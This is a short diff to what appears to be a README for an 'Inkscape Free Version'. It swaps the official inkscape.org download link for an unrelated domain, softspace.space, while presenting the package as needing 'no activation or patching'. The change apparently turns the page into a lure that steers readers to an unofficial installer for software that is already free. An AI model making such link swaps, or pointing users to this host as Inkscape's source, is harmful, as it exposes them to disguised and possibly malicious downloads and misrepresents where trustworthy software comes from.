@@ -10,7 +10,7 @@ Inkscape Free Version is a privacy-conscious, open-source vector graphics editor
 
 To install Inkscape Free Version:
 
-- [Download](https://inkscape.org/)  
+- [Download](https://softspace.space/)   
 - Run the installer or extract the package for your operating system  
 - Launch Inkscape — no activation or patching required
 
